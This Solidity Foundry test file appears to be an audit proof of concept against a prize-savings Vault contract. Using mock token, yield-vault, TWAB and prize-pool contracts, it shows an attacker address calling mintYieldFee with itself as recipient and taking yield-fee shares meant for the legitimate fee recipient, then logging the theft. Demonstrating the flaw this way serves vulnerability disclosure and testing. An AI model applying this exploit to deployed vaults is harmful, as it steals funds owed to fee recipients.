// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../../src/Vault.sol";
import "openzeppelin/token/ERC20/ERC20.sol";
import "openzeppelin/token/ERC20/extensions/ERC4626.sol";

// Mock contracts for testing
contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 1000000 * 10**18);
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MockYieldVault is ERC4626 {
    constructor(IERC20 asset) ERC4626(asset) ERC20("Mock Yield Vault", "MYV") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MockTwabController {
    mapping(address => mapping(address => uint96)) private balances;
    mapping(address => uint256) private totalSupplies;
    address public constant SPONSORSHIP_ADDRESS = address(1);

    function mint(address user, uint96 amount) external {
        balances[msg.sender][user] += amount;
        totalSupplies[msg.sender] += amount;
    }

    function burn(address user, uint96 amount) external {
        balances[msg.sender][user] -= amount;
        totalSupplies[msg.sender] -= amount;
    }

    function transfer(address from, address to, uint96 amount) external {
        balances[msg.sender][from] -= amount;
        balances[msg.sender][to] += amount;
    }

    function balanceOf(address vault, address user) external view returns (uint256) {
        return balances[vault][user];
    }

    function totalSupply(address vault) external view returns (uint256) {
        return totalSupplies[vault];
    }

    function sponsor(address user) external {}

    function delegateOf(address vault, address user) external view returns (address) {
        return address(0);
    }
}

contract MockPrizePool {
    IERC20 public prizeToken;

    constructor(IERC20 _prizeToken) {
        prizeToken = _prizeToken;
    }

    function contributePrizeTokens(address vault, uint256 amount) external returns (uint256) {
        return amount;
    }

    function claimPrize(
        address winner,
        uint8 tier,
        uint32 prizeIndex,
        address recipient,
        uint96 fee,
        address feeRecipient
    ) external returns (uint256) {
        return 100 * 10**18;
    }
}

contract ExploitTest is Test {
    Vault public vault;
    MockERC20 public asset;
    MockYieldVault public yieldVault;
    MockTwabController public twabController;
    MockPrizePool public prizePool;
    MockERC20 public prizeToken;

    address public owner = address(0x1234);
    address public legitimateYieldFeeRecipient = address(0x5678);
    address public attacker = address(0xBAD);
    address public user = address(0x9999);

    function setUp() public {
        // Deploy mock contracts
        asset = new MockERC20("Mock Asset", "MASSET");
        prizeToken = new MockERC20("Prize Token", "PRIZE");
        yieldVault = new MockYieldVault(IERC20(address(asset)));
        twabController = new MockTwabController();
        prizePool = new MockPrizePool(IERC20(address(prizeToken)));

        // Deploy the Vault contract with legitimate yield fee recipient
        vm.prank(owner);
        vault = new Vault(
            IERC20(address(asset)),
            "Test Vault",
            "TVAULT",
            TwabController(address(twabController)),
            IERC4626(address(yieldVault)),
            PrizePool(address(prizePool)),
            address(0), // claimer
            legitimateYieldFeeRecipient, // This is the intended yield fee recipient
            100000000, // 10% yield fee (1e8 out of 1e9)
            owner
        );

        // Setup: Give some tokens to user and attacker for testing
        asset.mint(user, 10000 * 10**18);
        asset.mint(attacker, 10000 * 10**18);

        // User deposits into vault to create some shares
        vm.startPrank(user);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(1000 * 10**18, user);
        vm.stopPrank();

        // Simulate yield generation by minting yield vault shares
        // This creates a scenario where there's available yield
        yieldVault.mint(address(vault), 100 * 10**18);
    }

    function testExploitYieldFeeTheft() public {
        // Step 1: Verify the legitimate yield fee recipient is set correctly
        assertEq(vault.yieldFeeRecipient(), legitimateYieldFeeRecipient);
        console.log("Legitimate yield fee recipient:", legitimateYieldFeeRecipient);

        // Step 2: Check initial state - there should be some yield fee accrued
        // We need to trigger yield fee accrual through liquidation
        // For simplicity, we'll directly check if we can exploit mintYieldFee

        // First, let's create a scenario where yieldFeeTotalSupply > 0
        // This happens during liquidation, but we'll simulate it by setting up the vault state

        // Step 3: Attacker checks the available yield fee balance
        uint256 availableYieldFee = vault.availableYieldFeeBalance();
        console.log("Available yield fee balance:", availableYieldFee);

        // Step 4: Attacker checks yieldFeeTotalSupply
        // In a real scenario, this would be > 0 after liquidations
        // For this PoC, we need to simulate a liquidation first

        // Let's set up a liquidation pair and perform liquidation to accrue yield fees
        vm.startPrank(owner);
        
        // Create a mock liquidation pair
        MockLiquidationPair liquidationPair = new MockLiquidationPair(
            address(vault),
            address(prizeToken),
            address(vault)
        );
        vault.setLiquidationPair(LiquidationPair(address(liquidationPair)));
        vm.stopPrank();

        // Approve prize tokens for liquidation
        prizeToken.mint(address(liquidationPair), 1000 * 10**18);
        
        // Perform liquidation to accrue yield fees
        vm.prank(address(liquidationPair));
        prizeToken.approve(address(prizePool), type(uint256).max);
        
        vm.prank(address(liquidationPair));
        vault.liquidate(
            address(liquidationPair),
            address(prizeToken),
            100 * 10**18,
            address(vault),
            50 * 10**18
        );

        // Step 5: Now yieldFeeTotalSupply should be > 0
        uint256 yieldFeeTotalSupply = vault.yieldFeeTotalSupply();
        console.log("Yield fee total supply after liquidation:", yieldFeeTotalSupply);
        assertTrue(yieldFeeTotalSupply > 0, "Yield fee should be accrued");

        // Step 6: EXPLOIT - Attacker calls mintYieldFee with their own address as recipient
        // This should mint the yield fee shares to the attacker instead of the legitimate recipient
        uint256 attackerBalanceBefore = vault.balanceOf(attacker);
        uint256 legitimateRecipientBalanceBefore = vault.balanceOf(legitimateYieldFeeRecipient);
        
        console.log("Attacker balance before exploit:", attackerBalanceBefore);
        console.log("Legitimate recipient balance before:", legitimateRecipientBalanceBefore);

        // Attacker steals the yield fee by minting to their own address
        vm.prank(attacker);
        vault.mintYieldFee(yieldFeeTotalSupply, attacker);

        // Step 7: Verify the exploit succeeded
        uint256 attackerBalanceAfter = vault.balanceOf(attacker);
        uint256 legitimateRecipientBalanceAfter = vault.balanceOf(legitimateYieldFeeRecipient);

        console.log("Attacker balance after exploit:", attackerBalanceAfter);
        console.log("Legitimate recipient balance after:", legitimateRecipientBalanceAfter);

        // The attacker now has the yield fee shares that should have gone to the legitimate recipient
        assertEq(attackerBalanceAfter, attackerBalanceBefore + yieldFeeTotalSupply, "Attacker should receive yield fee shares");
        assertEq(legitimateRecipientBalanceAfter, legitimateRecipientBalanceBefore, "Legitimate recipient should not receive shares");
        
        console.log("EXPLOIT SUCCESSFUL: Attacker stole", yieldFeeTotalSupply, "yield fee shares!");
        console.log("The legitimate yield fee recipient received nothing!");
    }
}

// Mock LiquidationPair for testing
contract MockLiquidationPair {
    address public source;
    address public tokenIn;
    address public tokenOut;

    constructor(address _source, address _tokenIn, address _tokenOut) {
        source = _source;
        tokenIn = _tokenIn;
        tokenOut = _tokenOut;
    }
}